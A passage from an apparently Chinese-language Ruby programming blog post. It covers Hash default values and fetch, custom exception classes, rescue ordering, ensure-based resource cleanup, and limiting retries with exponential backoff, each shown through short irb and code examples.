irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">007</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:weeks</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token symbol">:weeks</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"Monday"</span></span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Monday"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:months</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token symbol">:months</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"January"</span></span> 
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"January"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">009</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:weeks</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Monday"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">010</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:months</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"January"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">011</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:days</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当我们创建一个<code>Hash</code>时，传入一个<code>block</code>，当需要默认值时(也就是访问不到对应key时)，这个<code>block</code>就会被调用，并友好的返回一个空数组。<br>这里传入的<code>block</code>也可以接收两个参数，参数1表示Hash本身，参数2表示将要访问的key。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">012</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h <span class="token operator">=</span> <span class="token class-name">Hash</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>hash<span class="token punctuation">,</span>key<span class="token operator">|</span> hash<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">013</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:A</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token number">0</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">014</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">.</span>keys
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token symbol">:A</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也就是说我们访问一个不存在的键时，这时会自动将默认值保存。<br>一般情况下，我们要检索一个key存不存在，更常用的方式是使用：<code>Hash#.has_key?</code>，如果存在返回true，如果不存在放回false。如果直接是通过获取值来判断是否key存在，那当默认值不为<code>nil or false</code>时，<strong>就会一直判断为真。这里需要注意</strong><br>有另一种处理默认值的方式：<code>Hash#fetch</code>，可以接收一个参数，也可以接受两个参数，第一个参数表示，你将访问的key，第二个参数表示，如果找不到则默认返回什么值。如果只传递了一个参数，则当访问不到对应的key时，直接抛出异常。这在某些时候也是最好的方式。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">017</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">018</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">[</span><span class="token symbol">:week</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span><span class="token symbol">:week</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"Monday"</span></span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Monday"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">019</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> h<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span><span class="token symbol">:month</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span>irb<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">19</span><span class="token symbol">:in</span> `fetch'<span class="token operator">:</span> key <span class="token keyword">not</span> found<span class="token operator">:</span> <span class="token symbol">:month</span> <span class="token punctuation">(</span>KeyError<span class="token punctuation">)</span>
        from <span class="token punctuation">(</span>irb<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">19</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span>'
        from <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>ruby<span class="token operator">/</span>gems<span class="token operator">/</span><span class="token number">3.0</span><span class="token number">.0</span><span class="token operator">/</span>gems<span class="token operator">/</span>irb<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.1</span><span class="token operator">/</span>exe<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">9</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>top <span class="token punctuation">(</span>required<span class="token punctuation">)</span><span class="token operator">></span>'
        from <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>ruby<span class="token operator">/</span>gems<span class="token operator">/</span><span class="token number">3.0</span><span class="token number">.0</span><span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `load'
        from <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>ruby<span class="token operator">/</span>gems<span class="token operator">/</span><span class="token number">3.0</span><span class="token number">.0</span><span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>要点回顾</p>
</blockquote>
<ul>
<li>考虑使用默认的Hash值</li>
<li>当判断key存在时，使用<code>has_key?</code>判断，因为当访问不存在的键时，不一定都会返回<code>nil</code></li>
<li>如果我们希望返回hash的非法键时，返回<code>nil</code>，就不要使用默认值</li>
<li>相比使用默认值，有些时候<code>Hash#fetch</code>更安全<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="第二十二条：使用定制异常而不是抛出字符串"><a href="#第二十二条：使用定制异常而不是抛出字符串" class="headerlink" title="第二十二条：使用定制异常而不是抛出字符串"></a>第二十二条：使用定制异常而不是抛出字符串</h3>异常可以被看做是两种不同的语言特性混合：<strong>错误描述 和 控制流</strong><br>一般来说异常是一个包含着异常信息的对象，我们可以通过它来检测系统是否正常运转。并且我们可以通过<code>rescue</code>来捕获控制异常。</li>
</ul>
<p><strong>特定的异常类型代表特定的错误恢复方式，</strong>比如遇到网络超时的问题，引发的一个异常，我们可以短暂等待后重试。为此我们就需要从异常中获取更多的信息，但实际中：<br>大部分我们使用异常通过</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">raise</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"something wrong!!!"</span></span><span class="token punctuation">)</span>  

<span class="token keyword">raise</span><span class="token punctuation">(</span>RuntimeError<span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"something wrong!!!"</span></span><span class="token punctuation">)</span>   <span class="token comment"># 这一条与上面是等价的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>raise()</code>当接收一个参数时:</p>
<ol>
<li>参数是字符串，则创建RuntimeError对象，并附带异常信息</li>
<li>参数为异常类，则创建该类对象，异常信息就是类名本身</li>
<li>参数为异常类实例时，调用<code>exception()</code>方法，抛出一个异常对象</li>
</ol>
<p>如果决定抛出一个异常时，应该创建一个新的类型。下面有三个原则</p>
<ul>
<li>新的异常必须继承标准异常类</li>
<li>标准异常类是以<code>Exception</code>为基类的继承体系，我们应该继承<code>StandardError</code></li>
<li>最好异常类名称后缀为<code>Error</code></li>
</ul>
<p>从<code>StandardError</code>继承，也是因为当执行<code>rescue</code>没有指定类型时，会默认拦截<code>StandardError和其子类</code>。<br>我们先演示最简单的自定义异常类</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyError</span> <span class="token operator">&lt;</span> StandardError<span class="token punctuation">;</span> <span class="token keyword">end</span>

<span class="token keyword">raise</span><span class="token punctuation">(</span>MyError<span class="token punctuation">)</span>
<span class="token keyword">raise</span><span class="token punctuation">(</span>MyError<span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"there is no thing"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>现在我们有了定制的异常类，就可以保存多的详细信息了，比如：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyError</span> <span class="token operator">&lt;</span> StandardError
  <span class="token comment"># attr_reader :msg</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>msg <span class="token operator">=</span> <span class="token keyword">nil</span><span class="token punctuation">)</span>
    <span class="token variable">@msg</span> <span class="token operator">=</span> msg  <span class="token comment"># 保存特定的信息</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Something wrong: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@msg</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span class="token comment"># 完成基类的初始化，这样上游的Exception就能设置一些内部的实例变量和异常信息了</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">exception</span></span><span class="token punctuation">(</span><span class="token operator">*</span>string<span class="token punctuation">)</span>
    p <span class="token string-literal"><span class="token string">"MyError#exception running！！！"</span></span>
    <span class="token keyword">super</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">raise</span><span class="token punctuation">(</span><span class="token class-name">MyError</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"there is no thing"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 这里我们抛出MyError的一个实例</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到上面<code>raise(实例对象)</code>,这里实际上会调用该对象的<code>exception()</code>方法，抛出其返回的对象。<br>需要注意：</p>
<ul>
<li>单参数的raise，exception方法会被无参方式调用，这时候仅仅是将自身返回。</li>
<li>如果传递一个异常对象和一个错误信息，exception就会将错误信息作为唯一参数，对异常进行复制，将错误信息设置为给定信息然后将这个副本返回。这时候抛出的是一个副本。</li>
</ul>
<p>像我们上面的写了初始化方法，这时候如果<code>raise(对象,异常)</code>，就会覆盖初始化中的错误信息。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">raise</span><span class="token punctuation">(</span><span class="token class-name">MyError</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"there is no thing"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"other wrong"</span></span><span class="token punctuation">)</span> 
<span class="token comment"># in `&lt;main>': other wrong (MyError)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>所以如果我们不想让我们的信息被覆盖，则应该只传一个对象。<br>最终很重要的一点，如果需要许多异常类，应该考虑组织继承关系。也就是设计一个基类，并让其他类继承它，当然基类应该继承<code>StandardError</code>。</p>
<blockquote>
<p>要点回顾：</p>
</blockquote>
<ul>
<li><p>避免使用字符串作为异常，会被转为<code>RuntimeError</code>对象，相反我应该定制自己的异常类</p>
</li>
<li><p>定义异常类，应该继承<code>StandardError</code>，并定义类名时，使用<code>Error</code>作为后缀。</p>
</li>
<li><p>多个异常类时，考虑其组织关系</p>
</li>
<li><p>如果定制异常类编写了<code>initialze</code>方法，则应该确保调用<code>super</code>方法，最好在调用时，以错误信息作为参数。</p>
</li>
<li><p>在<code>initialze</code>中设置错误信息时，需要记着在raise方法中再度设置错误信息会被覆盖在<code>initialze</code>中设置的那一条。</p>
<h3 id="第二十三条：捕获可能的最具体的异常"><a href="#第二十三条：捕获可能的最具体的异常" class="headerlink" title="第二十三条：捕获可能的最具体的异常"></a>第二十三条：捕获可能的最具体的异常</h3><p>当我们进行异常捕获时，我们通常会选择使用：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">begin</span> 
    task<span class="token punctuation">.</span>perform
<span class="token keyword">rescue</span> <span class="token operator">=></span> e
    logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"task failed: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">e</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的代码中，我们异常捕获没有指定具体的异常信息，那么默认就会捕获<code>StandardError</code>及其子类的异常。比如当出现某些特定的异常，我需要进行记录与操作，那肯定就不能与<code>StandardError</code>混为一谈，我们需要把他们拆分出来，这里可以想象为白名单与黑名单。<br>因为Ruby中异常的捕获是有先后顺序的，当我们使用黑名单模式时，默认特定的异常需要处理，而其余的则向上抛出，那么首先要列出所有你不想处理的异常，捕获他们并抛出，然后再不过其他你希望处理的异常，很显然这是噩梦，因为你不知道有多少异常可能出现。<br>但是当我们会用白名单模式时，我们只需要处理明确的异常，其他的异常抛出。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">begin</span>
   task<span class="token punctuation">.</span>perform
 <span class="token keyword">rescue</span> NetworkDownError <span class="token operator">=></span> e
   <span class="token comment"># 重新连接逻辑</span>
 <span class="token keyword">rescue</span> InvalidRecordError <span class="token operator">=></span> e
   <span class="token comment"># Send record to support staff..</span>
 <span class="token keyword">rescue</span> <span class="token operator">=></span> e
   <span class="token comment"># 进行记录</span>
   <span class="token keyword">raise</span>
 <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样就能清晰明了的控制异常了，但是有一个<strong>潜在的问题，</strong>当异常捕获时，我们进行相关处理的逻辑又抛出了异常，则这时候新的异常就会替换原先发生的问题。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">InvalidRecordError</span> <span class="token operator">&lt;</span> StandardError<span class="token punctuation">;</span> <span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">NetworkDownError</span> <span class="token operator">&lt;</span> StandardError<span class="token punctuation">;</span> <span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">retryConnect</span></span>
  p <span class="token string-literal"><span class="token string">"重新连接"</span></span>
  <span class="token keyword">raise</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"这是重新连接的异常"</span></span><span class="token punctuation">)</span>  <span class="token comment"># 这里抛出了异常，外部无法处理</span>
<span class="token keyword">end</span>

<span class="token keyword">begin</span>
  <span class="token keyword">raise</span><span class="token punctuation">(</span>NetworkDownError<span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"这是最初的异常"</span></span><span class="token punctuation">)</span>
<span class="token keyword">rescue</span> NetworkDownError <span class="token operator">=></span> e
  <span class="token comment"># 重新连接逻辑</span>
  retryConnect  <span class="token comment"># 当这里执行时</span>
<span class="token keyword">rescue</span> InvalidRecordError <span class="token operator">=></span> e
  <span class="token comment"># Send record to support staff..</span>
<span class="token keyword">rescue</span> <span class="token operator">=></span> e
  <span class="token comment"># 进行记录</span>
  <span class="token keyword">raise</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们通过一个特殊的方法来解决问题</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">send_to_support_staff</span></span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
  <span class="token comment"># ...  这里执行原先的操作</span>
<span class="token keyword">rescue</span>
  <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>  <span class="token comment"># 如果发生了异常，就把原先的异常抛出去</span>
<span class="token keyword">end</span>

<span class="token keyword">begin</span>
  <span class="token keyword">raise</span><span class="token punctuation">(</span>NetworkDownError<span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"这是最初的异常"</span></span><span class="token punctuation">)</span>
<span class="token keyword">rescue</span> NetworkDownError <span class="token operator">=></span> e
  <span class="token comment"># 重新连接逻辑</span>
  send_to_support_staff<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">rescue</span> InvalidRecordError <span class="token operator">=></span> e
  <span class="token comment"># Send record to support staff..</span>
<span class="token keyword">rescue</span> <span class="token operator">=></span> e
  <span class="token comment"># 进行记录</span>
  <span class="token keyword">raise</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>要点回顾</p>
</blockquote>
</li>
<li><p>只捕获那些你知道如何恢复的异常</p>
</li>
<li><p>当捕获异常时，首先处理最特殊的类，在异常的继承关系中位置越高的，越应该放到rescue链后面</p>
</li>
<li><p>避免捕获<code>StandardError</code>这样的通用异常，如果这么写了，就应该想是否可以通过<code>ensure</code>解决</p>
</li>
<li><p>在异常发生的情况下，从rescue中抛出的异常将会替换当前异常并离开当前作用域</p>
<h3 id="第二十四条：通过块儿和ensure管理资源"><a href="#第二十四条：通过块儿和ensure管理资源" class="headerlink" title="第二十四条：通过块儿和ensure管理资源"></a>第二十四条：通过块儿和ensure管理资源</h3><p>当我们需要对某个文件进行操作时，当操作完后，需要关闭连接，来保证内存不会泄露：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"file_name"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"w"</span></span><span class="token punctuation">)</span>
p <span class="token string-literal"><span class="token string">"做各种操作"</span></span>
file<span class="token punctuation">.</span>close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>但实际上，代码的世界中充满了异常发生的可能性，就我们上面的代码，当执行各种操作时，如果被抛出了异常，则无法进行文件资源关闭，也就会导致内存无法被及时的回收，幸好Ruby为我们提供了<code>begin / ensure</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">begin</span>
file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"file_name"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"w"</span></span><span class="token punctuation">)</span>
p <span class="token string-literal"><span class="token string">"做各种操作"</span></span>
<span class="token keyword">ensure</span>
file<span class="token punctuation">.</span>close <span class="token keyword">if</span> file   <span class="token comment"># 这里确保资源被初始化后才能回收，避免空指针</span>
<span class="token keyword">end</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样就保证了代码即便抛出异常，也能保证文件资源被关闭。<br>上面一切看起来都是完美的，但每次都这么写，回收资源部分就很重复，所以<code>File.open()</code>中可以传递一个<code>block</code>：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"file_name"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"w"</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>file<span class="token operator">|</span>
  p <span class="token string-literal"><span class="token string">"做各种操作"</span></span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>  这里的操作中，我们将执行的操作都放入传递的<code>block</code>中，这样不管代码是否抛出异常，文件资源都会被回收掉。这样我们也不用担心忘写释放资源的代码了。我们来探索一下实际发生了什么：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">FakeFile</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">open</span></span><span class="token punctuation">(</span>file_name<span class="token punctuation">,</span>operation<span class="token punctuation">)</span>
    file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span>file_name<span class="token punctuation">,</span> operation<span class="token punctuation">)</span>
    <span class="token keyword">if</span> block_given<span class="token operator">?</span>
      <span class="token keyword">yield</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>
    <span class="token keyword">else</span> 
      file
    <span class="token keyword">end</span>
  <span class="token keyword">ensure</span>
    <span class="token keyword">if</span> block_given<span class="token operator">?</span>
      file<span class="token punctuation">.</span>close <span class="token keyword">if</span> file
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

FakeFile<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"file_name"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"w"</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>file<span class="token operator">|</span>
  p <span class="token string-literal"><span class="token string">"做任何操作"</span></span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的代码我们就简易的实现了其中的原理，这种方式简洁明了，并且代码复杂度不高，将释放资源等操作，悄悄的安排在了幕后。<br>以此类推，当我们遇到要明确释放资源的操作，比如拍它锁之类的，就可以统一用这种简洁的方式使用了。</p>
<blockquote>
<p>要点回顾</p>
</blockquote>
</li>
<li><p>通过<strong>ensure</strong>语句来释放任何已获得的资源</p>
</li>
<li><p>通过在类方法上使用<strong>块</strong>和<strong>ensure</strong>来将资源管理的逻辑抽离出来</p>
</li>
<li><p>确保<strong>ensure</strong>语句中的变量已经被初始化过了</p>
<h3 id="第二十五条：通过临近的end退出ensure语句"><a href="#第二十五条：通过临近的end退出ensure语句" class="headerlink" title="第二十五条：通过临近的end退出ensure语句"></a>第二十五条：通过临近的end退出ensure语句</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">method</span></span>
  <span class="token keyword">raise</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"123"</span></span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"abc"</span></span>
<span class="token keyword">ensure</span>
  <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"123"</span></span>
<span class="token keyword">end</span>

p method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但我们执行下面的代码发现，<code>ensure语句中的return</code>丢弃了所有类型的异常，而是进行正常的返回。<br>而如果把抛出异常的代码去掉，返回的还是<code>ensure</code>中的内容。<br>需要注意的是当在一个循环中时，ensure中的 next 和 break 都会悄悄丢弃异常</p>
<blockquote>
<p>要点回顾：</p>
</blockquote>
</li>
<li><p>不要在<code>ensure</code>中显式使用<code>return</code>语句</p>
</li>
<li><p>不要在<code>ensure</code>中直接使用<code>throw</code>，而应该把<code>throw</code>放到方法主体内</p>
</li>
<li><p>当执行迭代时，不要在<code>ensure</code>中执行next和break，需要考虑迭代内需不需要<code>begin</code>块儿，是否应该关系反转，在<code>begin</code>块儿中执行迭代</p>
</li>
<li><p>将改变控制流的工作放到<code>rescue</code>中更合适，而不是在ensure中</p>
<h3 id="第二十六条：限制retry次数，改变重试频率并记录异常信息"><a href="#第二十六条：限制retry次数，改变重试频率并记录异常信息" class="headerlink" title="第二十六条：限制retry次数，改变重试频率并记录异常信息"></a>第二十六条：限制retry次数，改变重试频率并记录异常信息</h3><p>当我们捕获的一个异常时，这个异常可能是第三方随机出现的问题，但通过重新调用可能就会成功，我们使用下面的代码：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">begin</span>
  service<span class="token punctuation">.</span>update<span class="token punctuation">(</span>record<span class="token punctuation">)</span>
<span class="token keyword">rescue</span> VendorDeadLockError
  sleep<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>
  <span class="token keyword">retry</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>  这个方案有个显而易见的问题，性能很差，而且如果一直爆出<code>VendorDeadLockError</code>异常，就会隐性的无限循环，所以我们可以用一个计数器，保证不会无限循环</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">retries <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">begin</span>
  service<span class="token punctuation">.</span>update<span class="token punctuation">(</span>record<span class="token punctuation">)</span>
<span class="token keyword">rescue</span> VendorDeadLockError
  <span class="token keyword">raise</span> <span class="token keyword">if</span> retries <span class="token operator">>=</span> <span class="token number">3</span>
  retries <span class="token operator">+=</span> <span class="token number">1</span>
  sleep<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>
  <span class="token keyword">retry</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要<strong>注意</strong>：retries需要定义在begin块儿之外，否则每次循环都为0<br>还要注意一点，要保证使用retry时记录异常的发生。否则如果retry的时候又抛出了异常，则原始异常就被覆盖了。<br>最后一点，可以优化重试的频率。这里我们可以采取指数级增加延时。延时时间和重试次数都要尽可能小。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">retries <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">begin</span>
  service<span class="token punctuation">.</span>update<span class="token punctuation">(</span>record<span class="token punctuation">)</span>
<span class="token keyword">rescue</span> VendorDeadLockError
  <span class="token keyword">raise</span> <span class="token keyword">if</span> retries <span class="token operator">>=</span> <span class="token number">3</span>
  retries <span class="token operator">+=</span> <span class="token number">1</span>
  sleep<span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">**</span> retries<span class="token punctuation">)</span>
  <span class="token keyword">retry</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>要点回顾</p>
</blockquote>
</li>
